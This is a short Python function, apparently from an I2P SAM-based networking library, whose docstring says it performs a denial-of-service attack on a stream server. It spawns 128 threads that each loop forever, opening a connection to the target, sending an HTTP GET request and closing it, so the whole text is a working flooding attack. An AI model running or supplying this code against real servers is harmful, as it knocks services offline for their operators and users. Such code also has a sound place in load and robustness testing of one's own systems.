def dos_stream(dest):
    'Perform a DOS attack on a stream server.'
    dest = sam.resolve(dest)

    def f():
        while True:
            S = sam.socket(dest, sam.SOCK_STREAM)
            S.connect(dest)
            S.send('GET / HTTP/1.0\r\n\r\n')
            S.close()
    for i in range(128):
        T = threading.Thread(target=f)
        T.start()
